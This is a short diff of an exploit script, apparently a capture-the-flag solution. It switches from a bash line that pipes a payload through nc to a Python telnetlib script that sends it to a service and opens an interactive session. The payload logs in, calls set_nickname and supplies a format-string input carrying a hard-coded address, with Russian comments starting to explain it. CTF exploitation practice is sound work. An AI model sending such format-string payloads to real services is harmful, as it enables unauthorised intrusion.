@@ -1,5 +1,7 @@
-#!/bin/bash
-python -c "print('AAAA\nAAAA\nset_nickname\n%64xBBBBBBBB\x5d\x0b\x40\x00\nexit\n')" | nc service port
+from telnetlib import *
+con = Telnet('ip', port)
+con.write('AAAA\nAAAA\nset_nickname\n%64xBBBBBBBB\x5d\x0b\x40\x00\nexit\n')
+con.interact()
 
 # Разбора пэйлоада:
     # AAAA\nAAAA\n      -> пропускаем "Login"
